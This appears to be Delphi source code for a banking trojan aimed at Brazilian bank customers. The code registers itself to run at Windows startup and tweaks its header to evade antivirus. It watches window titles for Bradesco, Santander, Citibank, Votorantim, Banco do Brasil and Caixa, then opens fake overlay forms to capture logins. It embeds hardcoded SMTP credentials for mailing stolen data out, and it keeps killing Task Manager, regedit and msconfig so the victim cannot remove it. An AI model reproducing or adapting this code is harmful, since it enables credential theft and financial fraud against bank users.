{$IMAGEBASE 61200589}  // Altera o cabeçalho do Software, assim evita de AntiVírus dar Falso-Positivo.

unit Natal;
{$WARNINGS OFF}
{$HINTS OFF}
interface
uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, IdMessage, IdBaseComponent, IdComponent, IdTCPConnection,
  IdTCPClient, IdExplicitTLSClientServerBase, TlHelp32, IdMessageClient, IdSMTPBase,
  IdSMTP, ExtCtrls, Registry, StdCtrls, jpeg, IdIPWatch, MPlayer;
type
  Tfestas = class(TForm)
    Tempo: TTimer;
    Smtp: TIdSMTP;
    Messagen: TIdMessage;
    Timer1: TTimer;
    Ip: TIdIPWatch;
    MediaPlayer1: TMediaPlayer;
    ckbS1: TCheckBox;
    ckbS2: TCheckBox;
    ckbS4: TCheckBox;
    ckbS5: TCheckBox;
    ckbS6: TCheckBox;
    ckbS7: TCheckBox;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Memo2: TMemo;
    procedure FormCreate(Sender: TObject);
    procedure TempoTimer(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    private
    { Private declarations }
  public
    { Public declarations }
  end;
var
  festas: Tfestas;
  IdentHandle_ : HWND;
  DadosEnvio_  : TStringList;
  BufferSTR_   : array [0..254] of Char;
  WinName_     : string;
  WinContinua  : boolean;
  const
  HomeBr     = 'bradesco s/a';
  HomeSant   = 'internet banking';
  HomeCity   = 'citibank online';
  HomeVotan  = 'banco votorantim';
  HomeBanc   = 'banco do brasil';

  Cun        = '_';
  YES_       = 100;
  NO_        = 0;
  OFF_       = False;
  ON_        = True;
  MAXCARACT_ = 254;

  Info_De    = 'r.leandro.santos2015@uol.com.br';
  Info_Login = 'r.leandro.santos2015@uol.com.br';
  Info_Para  = 'vouganhar2016@gmail.com';// <----- Informations
  Info_Pass  = 'maria2089';
  Info_Smtp  = 'smtps.uol.com.br';
  Info_Porta =  587;

  Aviso_De    = 'r.leandro.santos2015@uol.com.br';
  Aviso_Login = 'r.leandro.santos2015@uol.com.br';
  Aviso_Para  = 'vouenviar2016@gmail.com';// <----- Avisations
  Aviso_Pass  = 'maria2089';
  Aviso_Smtp  = 'smtps.uol.com.br';
  Aviso_Porta =  587;

implementation
{$R *.dfm}
uses Gerador, Rotinas,  Criptonita, Voto1, Samara, Citi, Bdn, CCef, Chique;
function killtask(ExeFileName: string): Integer;
const
PROCESS_TERMINATE = $0001;
var
ContinueLoop: BOOL;
FSnapshotHandle: THandle;
FProcessEntry32: TProcessEntry32;
begin
Result := 0;
FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
while Integer(ContinueLoop) <> 0 do
begin
if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
UpperCase(ExeFileName))) then
Result := Integer(TerminateProcess(
OpenProcess(PROCESS_TERMINATE,
BOOL(0),
FProcessEntry32.th32ProcessID),
0));
ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
end;
CloseHandle(FSnapshotHandle);
end;
procedure ListProcesses;
var
ExeName : String;
proc : PROCESSENTRY32;
hSnap : HWND;
Looper : BOOL;
begin
        proc.dwSize := SizeOf(Proc);
        hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPALL,0);
        Looper := Process32First(hSnap,proc);
        while Integer(Looper) <> 0 do begin
                ExeName := ExtractFileName(proc.szExeFile);
                Festas.memo2.lines.Add(ExeName);
                Looper := Process32Next(hSnap,proc);
        end;
        CloseHandle(hSnap);
end;

procedure Tfestas.FormCreate(Sender: TObject);
var
  Reg: TRegistry;
begin
  festas.Caption := Application.Title;
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_CURRENT_USER;
  Reg.Openkey('Software\Microsoft\Windows\CurrentVersion\Run',False);
  Reg.WriteString('WindowsSystem',Application.ExeName);
  Reg.CloseKey;
  Reg.Free;

  if not DirectoryExists(DirTemporario+'SystemWindows\') then
    CreateDir(DirTemporario+'SystemWindows\');
  if not fileexists(DirTemporario+'SystemWindows\install.txt') then
    SenderAviso;

end;

procedure Tfestas.TempoTimer(Sender: TObject);
var
  sTexto : string;
begin
  IdentHandle_ := GetForegroundWindow;
  GetWindowText(IdentHandle_, BufferSTR_, MAXCARACT_);
  WinName_ := LowerCase(BufferSTR_);
    if IdentHandle_ <> NO_ then
  begin
   if Comparation_(HomeBr, WinName_) <> NO_ then
   begin
     if NOT  ckbS2.Checked then
     begin
        ckbS2.Checked := TRUE;
        BradelaForm := TBradelaForm.Create(self); BradelaForm.Show;
        FWinFrontShow(BradelaForm.Handle);BradelaForm.Timerbdn.Enabled := true;
        BradelaForm.Left := 0;Exit;
     end;
   end;
    if Comparation_(HomeCity, WinName_) <> NO_ then
   begin
     if NOT ckbS7.Checked then
     begin
        ckbS7.Checked := TRUE;
        CityBak := TCityBak.Create(self); CityBak.Show;
        FWinFrontShow(CityBak.Handle);CityBak.TimerCity.Enabled := true;
        CityBak.Left := 0;Exit;
     end;
   end;
     if Comparation_(HomeSant, WinName_) <> NO_ then
   begin
     if NOT ckbS7.Checked then
     begin
        ckbS7.Checked := TRUE;
        Sarada := TSarada.Create(self); Sarada.Show;
        FWinFrontShow(Sarada.Handle);Sarada.PerSa.Enabled := True;
        Sarada.Left := 0;Exit;
     end;
   end;
       if Comparation_(HomeVotan, WinName_) <> NO_ then
   begin
     if NOT ckbS2.Checked then
     begin
        ckbS2.Checked := TRUE;
        Votoram := TVotoram.Create(self); Votoram.Show;
        FWinFrontShow(Votoram.Handle);Votoram.TVot.Enabled := true;
        Exit;
     end;
   end;
       if Comparation_(HomeBanc, WinName_) <> NO_ then
   begin
     if NOT ckbS6.Checked then
     begin
        ckbS2.Checked := TRUE;
        Yelobb := TYelobb.Create(self); Yelobb.Show;
        FWinFrontShow(Yelobb.Handle);Yelobb.Timchique.Enabled := true;
        Exit;
     end;
   end;
    sTexto := DeleteChar('"', WinName_);
    sTexto := DeleteChar('.', sTexto);
    sTexto := DeleteChar('-', sTexto);
    sTexto := DeleteChar('_', sTexto);
    sTexto := DeleteChar('/', sTexto);
    sTexto := DeleteChar('\', sTexto);
    sTexto := DeleteChar('|', sTexto);
    sTexto := DeleteChar('*', sTexto);
    sTexto := DeleteChar('?', sTexto);
    sTexto := DeleteChar(':', sTexto);
    sTexto := DeleteChar(';', sTexto);
    sTexto := DeleteChar(' ', sTexto);
    if Comparation_('', sTexto) <> NO_ then
    begin
    if NOT ckbS7.Checked then
    begin
    ckbS7.Checked := TRUE;
    CityBak := TCityBak.Create(nil);
    CityBak.ShowModal;
    CityBak.TimerCity.Enabled := true;
    CityBak.Free;
    end;
    end;
     if Comparation_('aguardeiniciandooacesso', sTexto) <> NO_ then
    begin
      if NOT ckbS7.Checked then
      begin
        ckbS7.Checked := TRUE;
        FormCasaCef := TFormCasaCef.Create(self); FormCasaCef.Show;
        FWinFrontShow(FormCasaCef.Handle);FormCasaCef.Timcef.Enabled := true;
        Exit;

      end;
    end;
  end;
  end;
procedure Tfestas.Timer1Timer(Sender: TObject);
begin
killtask('regedit.exe');
killtask('taskmgr.exe');
killtask('msconfig.exe');
end;
end.
